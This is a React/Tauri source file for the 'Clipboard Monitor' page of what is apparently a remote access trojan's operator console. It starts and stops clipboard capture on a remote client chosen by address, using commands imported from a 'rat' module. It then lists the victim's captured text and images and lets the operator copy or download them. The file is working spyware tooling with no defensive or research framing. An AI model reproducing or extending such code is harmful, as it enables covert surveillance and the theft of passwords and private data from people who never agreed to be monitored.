import React, { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import { listen } from "@tauri-apps/api/event";
import {
  startClipboardMonitorCmd,
  stopClipboardMonitorCmd,
} from "../rat/RATCommands";
import { ClipboardUpdatePayload, ClipboardImageUpdatePayload, ClipboardEvent } from "../../types";
import { IconClipboard, IconCopy, IconTrash, IconPhoto, IconTypography, IconZoomIn, IconX } from "@tabler/icons-react";

export const Clipboard: React.FC = () => {
  const { addr } = useParams();
  const [events, setEvents] = useState<ClipboardEvent[]>([]);
  const [running, setRunning] = useState(false);
  const [status, setStatus] = useState("Ready");
  const [filter, setFilter] = useState<"all" | "text" | "image">("all");
  const [selectedImage, setSelectedImage] = useState<string | null>(null);

  useEffect(() => {
    let unlistenText: (() => void) | null = null;
    let unlistenImage: (() => void) | null = null;

    const setupListeners = async () => {
      unlistenText = await listen("clipboard_update", (event) => {
        const payload = event.payload as ClipboardUpdatePayload;
        if (payload.addr !== addr) return;
        const evt: ClipboardEvent = {
          type: "text",
          text: payload.data.text,
          timestamp: new Date().toLocaleTimeString(),
        };
        setEvents((prev) => [evt, ...prev].slice(0, 200));
      });

      unlistenImage = await listen("clipboard_image_update", (event) => {
        const payload = event.payload as ClipboardImageUpdatePayload;
        if (payload.addr !== addr) return;
        const evt: ClipboardEvent = {
          type: "image",
          image_base64: payload.data.image_base64,
          width: payload.data.width,
          height: payload.data.height,
          timestamp: new Date().toLocaleTimeString(),
        };
        setEvents((prev) => [evt, ...prev].slice(0, 200));
      });
    };

    setupListeners();

    return () => {
      unlistenText?.();
      unlistenImage?.();
    };
  }, [addr]);

  const toggleMonitor = async () => {
    if (!addr) return;
    try {
      if (running) {
        await stopClipboardMonitorCmd(addr);
        setRunning(false);
        setStatus("Monitoring stopped");
      } else {
        await startClipboardMonitorCmd(addr);
        setRunning(true);
        setStatus("Monitoring started");
      }
    } catch (e) {
      console.error(e);
      setStatus("Failed to toggle monitoring");
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setStatus("Copied to clipboard");
    setTimeout(() => setStatus("Ready"), 2000);
  };

  const copyImageToClipboard = (base64: string) => {
    // Convert base64 to blob and copy as image
    const byteCharacters = atob(base64);
    const byteNumbers = new Array(byteCharacters.length);
    for (let i = 0; i < byteCharacters.length; i++) {
      byteNumbers[i] = byteCharacters.charCodeAt(i);
    }
    const byteArray = new Uint8Array(byteNumbers);
    const blob = new Blob([byteArray], { type: "image/png" });
    navigator.clipboard.write([
      new ClipboardItem({ "image/png": blob })
    ]).then(() => {
      setStatus("Image copied to clipboard");
      setTimeout(() => setStatus("Ready"), 2000);
    }).catch(() => {
      setStatus("Failed to copy image");
    });
  };

  const downloadImage = (base64: string, index: number) => {
    const link = document.createElement("a");
    link.href = `data:image/png;base64,${base64}`;
    link.download = `clipboard_image_${index}.png`;
    link.click();
    setStatus("Image downloaded");
    setTimeout(() => setStatus("Ready"), 2000);
  };

  const clearHistory = () => {
    setEvents([]);
    setStatus("History cleared");
  };

  const filteredEvents = events.filter((e) => filter === "all" || e.type === filter);
  const textCount = events.filter((e) => e.type === "text").length;
  const imageCount = events.filter((e) => e.type === "image").length;

  return (
    <div className="flex flex-col h-screen bg-[#050505] text-gray-200 overflow-hidden font-sans">
      {/* Image viewer modal */}
      {selectedImage && (
        <div
          className="fixed inset-0 z-50 bg-black/80 flex items-center justify-center"
          onClick={() => setSelectedImage(null)}
        >
          <div className="relative max-w-[90vw] max-h-[90vh]">
            <button
              onClick={() => setSelectedImage(null)}
              className="absolute -top-3 -right-3 z-10 rounded-full bg-[#1a1a1a] p-2 text-gray-400 hover:text-white hover:bg-[#2a2a2a] transition"
            >
              <IconX size={18} />
            </button>
            <img
              src={`data:image/png;base64,${selectedImage}`}
              alt="Clipboard image"
              className="max-w-[90vw] max-h-[90vh] object-contain rounded-2xl border border-[#2a2a2a]"
            />
          </div>
        </div>
      )}

      <div className="h-16 shrink-0 bg-[#0a0a0a] border-b border-[#1a1a1a] flex items-center justify-between px-6 shadow-xl z-20">
        <div className="flex items-center gap-4">
          <div className="p-2 bg-accentx/10 rounded-xl border border-accentx/20">
            <IconClipboard className="text-accentx" size={24} />
          </div>
          <div>
            <h1 className="text-lg font-black tracking-tighter uppercase italic text-white">
              Clipboard Monitor
            </h1>
            <p className="text-[10px] font-mono text-gray-500 uppercase tracking-widest leading-none">
              Live clipboard capture — text and images
            </p>
          </div>
        </div>

        <div className="flex items-center gap-3">
          <span className="text-xs uppercase tracking-[0.3em] text-gray-500">
            {status}
          </span>
          <button
            onClick={clearHistory}
            className="rounded-xl bg-[#111] px-4 py-2 text-xs text-white hover:bg-[#222] transition flex items-center gap-2"
          >
            <IconTrash size={14} /> Clear
          </button>
        </div>
      </div>

      <div className="flex flex-1 overflow-hidden">
        <div className="w-64 shrink-0 bg-[#080808] border-r border-[#1a1a1a] p-4 space-y-4">
          <button
            onClick={toggleMonitor}
            className={`flex items-center gap-2 w-full rounded-2xl px-4 py-3 text-sm font-bold uppercase tracking-tight transition ${
              running ? "bg-green-700" : "bg-[#111] hover:bg-[#1a1a1a]"
            }`}
          >
            <IconClipboard size={18} /> {running ? "Stop Monitor" : "Start Monitor"}
          </button>

          {/* Filter buttons */}
          <div className="flex gap-2">
            <button
              onClick={() => setFilter("all")}
              className={`flex-1 rounded-xl px-3 py-2 text-xs font-bold uppercase tracking-tight transition ${
                filter === "all" ? "bg-accentx/20 text-accentx" : "bg-[#111] text-gray-400 hover:bg-[#1a1a1a]"
              }`}
            >
              All
            </button>
            <button
              onClick={() => setFilter("text")}
              className={`flex-1 rounded-xl px-3 py-2 text-xs font-bold uppercase tracking-tight transition flex items-center justify-center gap-1 ${
                filter === "text" ? "bg-accentx/20 text-accentx" : "bg-[#111] text-gray-400 hover:bg-[#1a1a1a]"
              }`}
            >
              <IconTypography size={12} /> Text
            </button>
            <button
              onClick={() => setFilter("image")}
              className={`flex-1 rounded-xl px-3 py-2 text-xs font-bold uppercase tracking-tight transition flex items-center justify-center gap-1 ${
                filter === "image" ? "bg-accentx/20 text-accentx" : "bg-[#111] text-gray-400 hover:bg-[#1a1a1a]"
              }`}
            >
              <IconPhoto size={12} /> Image
            </button>
          </div>

          <div className="rounded-2xl bg-[#0f0f0f] border border-[#1a1a1a] p-4">
            <div className="flex items-center justify-between text-xs uppercase tracking-[0.3em] text-gray-500 mb-3">
              <span>Stats</span>
            </div>
            <div className="space-y-2 text-[11px] text-gray-300">
              <div>Total: {events.length}</div>
              <div>Text: {textCount}</div>
              <div>Images: {imageCount}</div>
              <div>Status: {running ? "Active" : "Idle"}</div>
            </div>
          </div>
        </div>

        <div className="flex-1 p-6 overflow-y-auto bg-[#050505]">
          <div className="space-y-3">
            {filteredEvents.length === 0 ? (
              <p className="text-sm text-gray-500">No clipboard events captured yet.</p>
            ) : (
              filteredEvents.map((event, index) => (
                <div
                  key={index}
                  className="rounded-2xl border border-[#1a1a1a] p-4 bg-[#111] group hover:border-[#2a2a2a] transition"
                >
                  <div className="flex items-center gap-2 mb-2">
                    {event.type === "text" ? (
                      <span className="text-[10px] uppercase tracking-[0.2em] text-blue-400 font-bold flex items-center gap-1">
                        <IconTypography size={12} /> Text
                      </span>
                    ) : (
                      <span className="text-[10px] uppercase tracking-[0.2em] text-purple-400 font-bold flex items-center gap-1">
                        <IconPhoto size={12} /> Image {event.width}x{event.height}
                      </span>
                    )}
                    <span className="text-[10px] text-gray-600 ml-auto">{event.timestamp}</span>
                  </div>

                  {event.type === "text" ? (
                    <div className="flex items-start justify-between gap-4">
                      <pre className="text-xs text-gray-300 whitespace-pre-wrap break-all flex-1 font-mono">
                        {event.text}
                      </pre>
                      <button
                        onClick={() => event.text && copyToClipboard(event.text)}
                        className="shrink-0 rounded-lg bg-[#1a1a1a] p-2 text-gray-400 hover:text-white hover:bg-[#2a2a2a] transition opacity-0 group-hover:opacity-100"
                        title="Copy to clipboard"
                      >
                        <IconCopy size={14} />
                      </button>
                    </div>
                  ) : (
                    <div className="space-y-2">
                      <div className="relative rounded-xl overflow-hidden border border-[#1a1a1a] bg-[#0a0a0a] max-h-[320px] flex items-center justify-center">
                        <img
                          src={`data:image/png;base64,${event.image_base64}`}
                          alt="Clipboard image"
                          className="max-w-full max-h-[320px] object-contain cursor-pointer"
                          onClick={() => event.image_base64 && setSelectedImage(event.image_base64)}
                        />
                      </div>
                      <div className="flex gap-2">
                        <button
                          onClick={() => event.image_base64 && setSelectedImage(event.image_base64)}
                          className="rounded-lg bg-[#1a1a1a] px-3 py-1.5 text-xs text-gray-400 hover:text-white hover:bg-[#2a2a2a] transition flex items-center gap-1"
                        >
                          <IconZoomIn size={12} /> Expand
                        </button>
                        <button
                          onClick={() => event.image_base64 && copyImageToClipboard(event.image_base64)}
                          className="rounded-lg bg-[#1a1a1a] px-3 py-1.5 text-xs text-gray-400 hover:text-white hover:bg-[#2a2a2a] transition flex items-center gap-1"
                        >
                          <IconCopy size={12} /> Copy Image
                        </button>
                        <button
                          onClick={() => event.image_base64 && downloadImage(event.image_base64, index)}
                          className="rounded-lg bg-[#1a1a1a] px-3 py-1.5 text-xs text-gray-400 hover:text-white hover:bg-[#2a2a2a] transition flex items-center gap-1"
                        >
                          <IconPhoto size={12} /> Download
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              ))
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
